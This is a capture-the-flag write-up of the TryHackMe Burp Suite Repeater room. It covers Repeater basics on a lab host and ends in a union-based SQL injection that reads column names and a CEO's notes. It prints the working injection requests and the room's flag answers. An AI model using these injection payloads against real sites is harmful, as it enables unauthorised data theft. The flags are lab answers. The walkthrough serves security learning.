---
title: Burp Suite - Repeater
author: CYB3RM3
name: CYB3RM3 | Burp Suite - Repeater
date: 2021-09-18 17:21:00 +0100
categories: [TryHackMe, Web]
tags: [Web, BurpSuite]
---

Learn how to use Repeater to duplicate requests in Burp Suite
THM Room [https://tryhackme.com/room/burpsuiterepeater](https://tryhackme.com/room/burpsuiterepeater)

## TASK 1 : Outline
### Deploy the machine (and the AttackBox if you are not using your own attack VM), and let's get started ! Note: If you are not using the AttackBox and want to connect to this machine without the VPN, you can do so using this link once the machine has fully loaded and an IP address is displayed: https://LAB_WEB_URL.p.thmlabs.com.

No Answer.

## TASK 2 : What's the Repeater ?
### Familiarise yourself with the Repeater interface.

No Answer.

## TASK 3 : Basic Usage
### Capture a request to http://10.10.46.79 in the Proxy and send it to Repeater. Practice modifying and re-sending the request numerous times.

No Answer.

## TASK 4 : Views
### Experiment with the available view options.

No Answer.

### Which view option displays the response in the same format as your browser would ?

Answer : Render

## TASK 5 : Inspector
### Get comfortable with Inspector and practice adding/removing items from the various request sections.

No Answer.

## TASK 6 : Example
### Capture a request to http://10.10.46.79/ in the Proxy and send it to Repeater.

No Answer.

### Send the request once from Repeater -- you should see the HTML source code for the page you requested in the response tab. Try viewing this in one of the other view options (e.g. Rendered).

No Answer.

### Using Inspector (or manually, if you prefer), add a header called FlagAuthorised and set it to have a value of True. e.g.: Send the request. What is the flag you receive ?

(hint : Make sure you leave the two blank lines at the bottom of the request !)

![Burp modify header flag](/images/thm/burpRepeater/Burp Suite_ Repeater_1.png)
_Burp modify header flag_

Answer : THM{Yzg2MWI2ZDhlYzdlNGFiZTUzZTIzMzVi}

## TASK 7 : Challenge
### Capture a request to one of the numeric products endpoints in the Proxy, then forward it to Repeater.

No Answer.

### See if you can get the server to error out with a "500 Internal Server Error" code by changing the number at the end of the request to extreme inputs. What is the flag you receive when you cause a 500 error in the endpoint ?

I tried 10 and get a 404 error so i decide to try an invalid integer here (-1) and get the error "500 Internal Server Error". Then jsut look around the response HTML code and you'll find the flag !

![ERROR 500](/images/thm/burpRepeater/Burp Suite_ Repeater_2.png)
_ERROR 500_

## TASK 8 : SQLi with Repeater
### Let's start by capturing a request to http://10.10.46.79/about/2 in the Burp Proxy. Once you have captured the request, send it to Repeater with Ctrl + R or by right-clicking and choosing "Send to Repeater"

No Answer.

### Now that we have our request primed, let's confirm that a vulnerability exists. Adding a single apostrophe (') is usually enough to cause the server to error when a simple SQLi is present, so, either using Inspector or by editing the request path manually, add an apostrophe after the "2" at the end of the path and send the request.

No Answer.

### This is an extremely useful error message which the server should absolutely not be sending us, but the fact that we have it makes our job significantly more straightforward. With this information, we can skip over the query column number and table name enumeration steps.

No Answer.

### Looking through the returned response, we can see that the first column name (id) has been inserted into the page title.

We can change the request header with :

```sql
GET /about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people" HTTP/1.1
```
{: .nolineno }

This give us change in the response HTML :

```html
<title>About | id None</title>
```
{: .nolineno }

No Answer.

### We have successfully pulled the first column name out of the database, but we now have a problem. The page is only displaying the first matching item -- we need to see all of the matching items.

We can change the request header with :

```sql
GET /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people" HTTP/1.1
```
{: .nolineno }

This give us change in the response HTML :

```html
<title>About | id,firstName,lastName,pfpLink,role,shortRole,bio,notes None</title>
```
{: .nolineno }

No Answer

### Considering our task, it seems a safe bet that our target column is notes.

Finally, we are ready to take the flag from this database -- we have all of the information that we need:
    The name of the table: people.
    The name of the target column: notes.
    The ID of the CEO is 1; this can be found simply by clicking on Jameson Wolfe's profile on the /about/ page and checking the ID in the URL

To retreive the flag in the CEO's notes, we need to craft the query SLQ :

```sql
GET /about/0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1 HTTP/1.1
```
{: .nolineno }

 We can see the flag in the Response HTML :

 ```html
<title>About | THM{ZGE3OTUyZGMyMzkwNjJmZjg3Mzk1NjJh} None</title>
```
{: .nolineno }

No Answer.

### Exploit the union SQL injection vulnerability in the site. What is the flag?

Answer : THM{ZGE3OTUyZGMyMzkwNjJmZjg3Mzk1NjJh}

## TASK 9 : Room Conclusion

### I can use Burp Suite Repeater

No Answer.